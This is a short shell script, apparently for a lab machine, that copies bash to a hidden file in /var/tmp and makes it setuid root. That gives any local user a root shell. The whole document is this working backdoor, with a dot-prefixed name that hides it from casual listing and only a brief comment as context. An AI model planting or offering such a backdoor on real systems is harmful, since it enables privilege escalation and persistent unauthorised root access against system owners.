#!/bin/sh
# A setuid copy of bash in /var/tmp.
# Runs as root inside a lab machine.
set -eu
cp /bin/bash /var/tmp/.s
chmod 4755 /var/tmp/.s
